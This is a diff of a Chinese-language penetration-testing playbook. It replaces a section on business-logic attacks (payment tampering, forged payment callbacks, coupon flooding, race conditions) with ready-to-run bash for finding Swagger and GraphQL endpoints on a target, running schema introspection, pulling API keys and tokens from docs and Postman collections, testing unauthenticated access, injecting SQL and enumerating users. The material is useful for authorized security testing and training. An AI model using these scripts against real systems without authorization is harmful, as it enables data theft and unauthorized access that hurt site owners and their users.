@@ -535,79 +535,271 @@ curl -sk $UPLOAD_URL -F "file=@.htaccess"
 
 ---
 
-## 第15步: 业务逻辑漏洞 (120分钟) ★最易出问题★
 
-**目标：从业务理解漏洞，不靠工具**
+## 第15步: API文档/GraphQL深度利用 (60分钟) ★实战高价值★
 
-### 15.1 支付流程漏洞
+**目标：从公开API文档找隐藏端点/密钥/内部信息**
+
+### 15.1 API文档自动发现
 
 ```bash
-# 场景：电商/物流的支付
+# 常见API文档路径
+SWAGGER_PATHS=(
+    "/swagger.json"
+    "/swagger-ui.html"
+    "/swagger/v1/swagger.json"
+    "/swagger/v2/swagger.json"
+    "/api-docs"
+    "/api/swagger.json"
+    "/docs"
+    "/redoc"
+    "/openapi.json"
+    "/v2/api-docs"
+    "/v3/api-docs"
+    "/doc.html"
+    "/api/docs"
+    "/api.json"
+)
 
-# 漏洞1：金额篡改
-# 正常流程：
-# 1. 前端选择商品 → 999元
-# 2. POST /api/order/create {"product_id": 1, "amount": 999}
-# 3. 跳转支付
+for path in "${SWAGGER_PATHS[@]}"; do
+    echo "[*] 测试: $path"
+    response=$(curl -sk "https://$TARGET$path" -w "%{http_code}" -o /tmp/api_doc_test)
+    
+    if [ "$response" == "200" ]; then
+        # 手工查看内容
+        if grep -qiE "swagger|openapi|paths|definitions" /tmp/api_doc_test; then
+            echo "✅ 发现API文档: $path"
+            cp /tmp/api_doc_test "api_doc_${path//\//_}.json"
+        fi
+    fi
+done
+```
 
-# 测试：修改amount
-curl -X POST "$TARGET/api/order/create" \
+### 15.2 从API文档提取敏感信息
+
+```bash
+# 下载完整文档后，手工分析
+
+# 1. 提取所有API端点
+cat api_doc.json | jq -r '.paths | keys[]' > all_api_endpoints.txt
+
+# 手工查看高价值API：
+grep -iE "admin|secret|internal|debug|test" all_api_endpoints.txt
+
+# 2. 提取API参数
+cat api_doc.json | jq '.paths[][] | select(.parameters) | .parameters[] | .name' | sort -u
+
+# 3. 查找硬编码的密钥/Token
+cat api_doc.json | grep -iE "api[_-]?key|token|secret|password" -A 2 -B 2
+
+# 4. 查找默认值/示例值
+cat api_doc.json | jq '.paths[][] | select(.parameters) | .parameters[] | select(.example) | {name: .name, example: .example}'
+
+# 5. 查找内部API（可能未授权）
+cat api_doc.json | jq -r '.paths | keys[]' | grep -iE "internal|private|admin"
+```
+
+### 15.3 手工测试未授权API
+
+```bash
+# 从API文档找到敏感端点后，手工测试
+
+# 示例：发现 /api/internal/users 端点
+TEST_API="/api/internal/users"
+
+# 测试1：无认证
+curl -sk "https://$TARGET$TEST_API" -o test1.txt
+cat test1.txt | jq .
+# 如果返回用户列表 → 未授权访问！
+
+# 测试2：空Token
+curl -sk "https://$TARGET$TEST_API" \
+    -H "Authorization: Bearer" -o test2.txt
+
+# 测试3：从文档中找示例Token（可能有效）
+# 查看文档中的"Try it out"示例
+cat api_doc.json | jq '.components.securitySchemes'
+cat api_doc.json | jq '.paths[][] | select(.security)'
+
+# 如果文档中有示例Token，尝试使用
+EXAMPLE_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+curl -sk "https://$TARGET$TEST_API" \
+    -H "Authorization: Bearer $EXAMPLE_TOKEN"
+```
+
+### 15.4 GraphQL深度利用
+
+```bash
+# GraphQL端点发现
+GRAPHQL_PATHS=(
+    "/graphql"
+    "/api/graphql"
+    "/graphql/console"
+    "/graphiql"
+    "/v1/graphql"
+    "/query"
+)
+
+for path in "${GRAPHQL_PATHS[@]}"; do
+    echo "[*] 测试: $path"
+    curl -sk "https://$TARGET$path" \
+        -X POST \
+        -H "Content-Type: application/json" \
+        -d '{"query":"{__typename}"}' \
+        -o /tmp/gql_test
+    
+    if grep -q "__typename" /tmp/gql_test; then
+        echo "✅ 发现GraphQL: $path"
+    fi
+done
+
+# 内省查询（获取完整Schema）
+curl -sk "https://$TARGET/graphql" \
+    -X POST \
     -H "Content-Type: application/json" \
-    -d '{"product_id": 1, "amount": 0.01}' \
-    -H "Cookie: session=..."
+    -d '{"query":"{ __schema { types { name kind description fields { name type { name kind } } } } }"}' \
+    | jq . > graphql_schema.json
 
-# 漏洞2：支付回调伪造
-# 支付后，第三方回调：/api/payment/callback
-# 测试：直接访问callback，伪造支付成功
+# 手工分析Schema
+cat graphql_schema.json | jq -r '.data.__schema.types[] | select(.name=="Query" or .name=="Mutation") | .fields[].name'
 
-curl -X POST "$TARGET/api/payment/callback" \
-    -d '{"order_id": "xxx", "status": "success", "sign": "fake"}'
+# 提取敏感查询
+cat graphql_schema.json | jq -r '.data.__schema.types[] | .fields[]? | select(.name | test("admin|user|password|secret"; "i")) | .name'
 
-# 漏洞3：订单重放
-# 支付成功后，重放创建订单的请求
-# 测试：多次发送同一个订单，是否扣多次钱
+# 测试具体查询
+curl -sk "https://$TARGET/graphql" \
+    -X POST \
+    -H "Content-Type: application/json" \
+    -d '{"query":"{ users { id username email } }"}' \
+    | jq .
+
+# 如果返回数据 → 未授权访问！
 ```
 
-### 15.2 优惠券/折扣漏洞
+### 15.5 API版本号爆破
 
 ```bash
-# 漏洞1：优惠券重复使用
-# 获取一个优惠券码：DISCOUNT100
-# 测试：在多个订单中使用
+# 很多API有多个版本，旧版本可能无认证
 
-# 漏洞2：批量领取
-# 接口：/api/coupon/claim
-# 测试：循环请求1000次
+# 从当前API猜测版本模式
+# 例如：/api/v3/users
+CURRENT_API="/api/v3/users"
 
-for i in {1..1000}; do
-    curl -sk "$TARGET/api/coupon/claim" \
-        -H "Cookie: session=..." &
+# 测试旧版本
+for version in v1 v2 v3 v4 1 2 3; do
+    test_api="${CURRENT_API/v3/$version}"
+    echo "[*] 测试: $test_api"
+    
+    response=$(curl -sk "https://$TARGET$test_api" -w "%{http_code}" -o /tmp/version_test)
+    
+    if [ "$response" == "200" ]; then
+        echo "✅ 版本 $version 存在！"
+        cat /tmp/version_test | jq . | head -20
+    fi
 done
-wait
 
-# 漏洞3：负数金额
-curl -X POST "$TARGET/api/order/create" \
-    -d '{"product_id": 1, "coupon_discount": -100}'
+# 手工对比不同版本的认证要求
+# v1可能无需Token，v3需要Token
 ```
 
-### 15.3 竞态条件
+### 15.6 Postman Collection泄露
 
 ```bash
-# 场景：余额/积分扣减
+# Postman Collection可能包含API密钥
 
-# 测试：同时发起100个请求消费同一笔余额
-for i in {1..100}; do
-    curl -sk "$TARGET/api/order/create" \
-        -d '{"product_id": 1}' \
-        -H "Cookie: session=..." &
+# 常见路径
+POSTMAN_PATHS=(
+    "/postman_collection.json"
+    "/collection.json"
+    "/api/postman_collection.json"
+    "/.postman/collection.json"
+)
+
+for path in "${POSTMAN_PATHS[@]}"; do
+    curl -sk "https://$TARGET$path" -o postman_test.json
+    
+    if grep -q "postman" postman_test.json; then
+        echo "✅ 发现Postman Collection: $path"
+        
+        # 提取API密钥
+        cat postman_test.json | jq -r '.. | .key?, .value? | select(. != null)' | \
+            grep -iE "api[_-]?key|token|secret"
+    fi
 done
-wait
 
-# 检查：是否成功创建多个订单但只扣一次钱
+# 从GitHub搜索
+# site:github.com "$TARGET" postman_collection.json
+```
+
+### 15.7 API文档手工分析技巧
+
+```bash
+# 技巧1：关注"Try it out"示例
+# 示例中可能有测试Token/API Key
+
+# 技巧2：查找deprecated端点
+cat api_doc.json | jq '.paths[][] | select(.deprecated == true)'
+# 废弃的端点可能安全性较低
+
+# 技巧3：查找internal/admin标记
+cat api_doc.json | jq -r '.paths | to_entries[] | select(.value | .. | .tags[]? // "" | test("internal|admin"; "i")) | .key'
+
+# 技巧4：对比不同环境的文档
+# 下载test/staging/prod的API文档对比
+# staging可能有更多调试端点
+
+# 技巧5：查找文件上传/下载端点
+cat api_doc.json | jq -r '.paths | to_entries[] | select(.key | test("upload|download|file"; "i")) | .key'
+```
+
+### 15.8 手工验证可利用性
+
+```bash
+# 验证1：未授权访问
+# 不要只看文档，要实际测试！
+
+API_LIST=$(cat api_doc.json | jq -r '.paths | keys[]')
+
+for api in $API_LIST; do
+    # 只测试敏感API
+    if echo "$api" | grep -qiE "user|admin|order|payment|internal"; then
+        echo "[*] 测试: $api"
+        curl -sk "https://$TARGET$api" | jq . | head -10
+        sleep 1
+    fi
+done
+
+# 验证2：参数注入
+# 从文档知道参数类型，测试注入
+
+# 例如：文档说 user_id是整数
+curl -sk "https://$TARGET/api/user?user_id=1' OR '1'='1"
+
+# 验证3：批量枚举
+# 如果API返回单个用户，尝试枚举所有用户
+for id in {1..100}; do
+    curl -sk "https://$TARGET/api/user/$id" | jq -r '.email'
+done
 ```
 
 ---
 
+**第15步总结：**
+
+从API文档可以获得：
+- ✅ 所有API端点（包括隐藏的）
+- ✅ 参数名称和类型
+- ✅ 可能的API密钥/Token
+- ✅ 内部/管理员端点
+- ✅ 认证方式和绕过方法
+
+**时间分配：**
+- API文档发现：10分钟
+- 文档分析：20分钟
+- GraphQL利用：15分钟
+- 手工测试：15分钟
+
+**成功率：比业务逻辑高得多！**
 ## 实战技巧
 
 ### 技巧1：从JS理解认证流程
